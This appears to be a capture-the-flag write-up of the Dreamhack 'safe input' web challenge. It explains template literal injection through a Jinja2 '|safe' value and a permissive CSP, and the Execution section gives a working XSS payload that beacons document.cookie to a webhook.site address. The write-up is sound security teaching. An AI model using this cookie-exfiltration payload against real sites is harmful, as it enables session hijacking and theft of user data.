---
title: "Dreamhack: safe input"
date: 2025-08-15
tags:
  - web
  - ctf
  - xss
  - jinja2
  - CSPBypass
  - TemplateLiteralInjection
draft: false
---
Link : [safe input](https://dreamhack.io/wargame/challenges/1671)

##### Description
```
It's so safe that it can't be seen.
```

# Solve

## Finding the Foothold

The root redirects to `/test`, which renders `test.html` with `test=request.args["text"]`. The interesting part is `/report`: it accepts a `text`, then `access_page(text)` launches a headless browser, **injects `flag=<FLAG>`**, and navigates to `/test?text=<text>`.

- Navigating to the origin **before** `add_cookie` is crucial; otherwise the cookie won’t be set.
- The cookie lacks `HttpOnly`, so `document.cookie` can read it.

Looking at the code, the `report()` route was the key. The flow is:

1. User submits text via `/report`.
2. The server’s `access_page()` function launches a headless browser. 
3. The bot first visits `http://127.0.0.1:8000/` and injects the flag cookie (`flag=FLAG`).
4. Then it loads `http://127.0.0.1:8000/test?text=<user input>`.

So the connection is: **input at report.html → passed via app.py → rendered in test.html → viewed by a bot carrying the flag cookie**.

```python title="app.py"
if access_page(text, cookie={"name": "flag", "value": FLAG}):
    return render_template("report.html", message="Success")
```

![[safe_input-20250827153804737.png]]

## Planning the Attack

The code in `test.html` looks like this:

```html title="test.html"
<script>
    const contentElement = document.getElementById('content');
    const safeInput = "Test: " + `{{test|safe}}`;
</script>
```

Here, the value from `/report` ends up inside `{{ test|safe }}`.  
So the connection is: **report.html → app.py → test.html**.

- `|safe` disables **HTML** escaping only; it does nothing for **JS** context.
- Inside a template literal, `${...}` gets **evaluated** during parsing. No DOM sinks needed.
- CSP only enforces Trusted Types; no `script-src` nonce/hash, no `connect-src` restriction → beacon out is allowed.

The `|safe` filter disables HTML escaping, but inside a JavaScript template literal it creates an injection point. Using `${...}`, arbitrary JavaScript code can be executed.

## Execution

The simplest approach is to exfiltrate the cookie with an image beacon. Using webhook.site as the receiver, the payload becomes:

```js
${new Image().src='https://webhook.site/f20cfac7-6608-4493-9615-b0dc27a6799d/?c='+document.cookie}
```

Steps:

1. Submit this payload via `/report`.
2. The bot opens `/test`, executes the script, and sends the cookie to webhook.site.
3. Check the webhook.site dashboard and see the request:

![[safe_input-20250827154106722.png]]

And that’s how the challenge is solved: by exploiting template literal injection in test.html, reached through the report → app.py → test.html flow, and stealing the bot’s cookie.